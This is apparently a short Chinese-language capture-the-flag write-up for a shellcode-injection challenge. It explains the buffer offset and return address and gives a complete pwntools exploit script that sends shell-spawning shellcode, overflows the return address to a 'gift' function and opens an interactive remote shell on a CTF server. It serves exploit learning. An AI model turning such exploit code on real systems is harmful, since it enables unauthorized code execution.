# 挑战简介
经典的shellcode注入

# 思路
找到能够执行shell的地址，这里是gift函数，地址在0x401256，偏移量是0x20，简单注入即可  
```
#!/usr/bin/python3
from pwn import *

# 设置环境
context.arch = 'amd64'  # 64位二进制文件
context.log_level = 'debug'  # 启用调试输出

# 启动目标程序
#target = process('./shellcode')  # 本地测试
target = remote('nc1.ctfplus.cn', 28811)  # 远程利用时使用

# 关键地址信息
gift_addr = p64(0x401256)        # gift函数的地址
shellcode_var = 0x4040B0    # shellcode变量的地址（在BSS段）

# 基于GDB分析的偏移量：从输入开始到返回地址
offset = 0x20  # 32字节

# 生成shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# 处理程序输出
print(target.recvuntil(b"do you know shellcode?\n"))
target.send(shellcode)
print(target.recvuntil(b"please input your name:\n"))

# 发送payload
target.sendline(b'a' * 0x20 + gift_addr)

# 进入交互模式
target.interactive()
```
